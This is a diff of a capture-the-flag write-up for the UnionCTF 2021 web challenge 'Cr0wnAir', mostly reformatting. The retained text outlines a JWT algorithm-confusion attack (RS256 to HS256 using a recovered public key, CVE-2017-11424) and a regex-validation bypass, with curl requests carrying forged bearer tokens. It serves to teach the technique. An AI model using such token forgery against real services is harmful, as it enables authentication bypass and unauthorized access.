@@ -1,15 +1,14 @@
 +++
-title = "[UnionCTF - 2021] Cr0wnAir"
-tags = ["ctf", "ret2school", "web", "JWT", "Tek", ""]
+title = "[UnionCTF 2021 - web] Cr0wnAir"
+tags = ["ctf", "ret2school", "web", "JWT", "Tek"]
 date = "2021-02-24"
 +++
 
+The challenge can be found [right here](https://github.com/ret2school/ctf/tree/master/2021/unionctf/web/cr0wnair/app_src).
 
 # UnionCTF - Cr0wnAir
 
 To solve this challenge, we had to exploit a vulnerability in `jpv` which allows us to bypass the regex validation in order to get a JWT. Then, we were able to change the algorithm from `RS256` to `HS256` and forge a new JWT with the public key, a key that we were able to retrieve thanks to a weak `e`.
-
----------
 
 The source code of the app is given, so let's take a look at it (only what will be interesting for us) :
 ```js
@@ -139,6 +138,7 @@ module.exports = router;
 After the analysis of the source code, we can notice an interesting path : we need to set `sssr` to `FQTU` to receive our JWT. And with this JWT, if the `status` is set to `gold`, we get the flag.
 However, the data we send to `/checkin` must check some regex : 
 ```js
+
 const pattern = {
   firstName: /^\w{1,30}$/,
   lastName: /^\w{1,30}$/,
@@ -228,6 +228,7 @@ jwt.decode(token, config.pubkey);
 ```
 
 and the library [source code](https://github.com/hokaccha/node-jwt-simple/blob/v0.5.1/lib/jwt.js#L58) :
+
 ```js
 
 /**
@@ -329,6 +330,7 @@ $ python3 x_CVE-2017-11424.py `cat jwt1` `cat jwt2`
 ```
 
 If we try with the first JWT, it seems that the token is valid but because we didn't set the `status` to `gold` we will not get the flag : 
+
 ```sh
 
 $ curl -X POST 'http://34.105.202.19:3000/upgrades/flag' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.6rQVuvqT2nGfkFOdS1YmN7Nuc5LapAb339XTJHf9F1Y'
@@ -337,6 +339,7 @@ $ curl -X POST 'http://34.105.202.19:3000/upgrades/flag' -H 'Authorization: Bear
 ```
 
 As contrary, we get an error with the second JWT : 
+
 ```sh
 
 $ curl -X POST 'http://34.105.202.19:3000/upgrades/flag' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.mN99DMtBLdPj4yFrLJncAe69XYWBiUersiWjoGhTBnE'
@@ -345,6 +348,7 @@ $ curl -X POST 'http://34.105.202.19:3000/upgrades/flag' -H 'Authorization: Bear
 ```
 
 We just have to take a look at the script and modify it to set `status` to `gold` and get the flag : 
+
 ```sh
 
 $ vim x_CVE-2017-11424.py
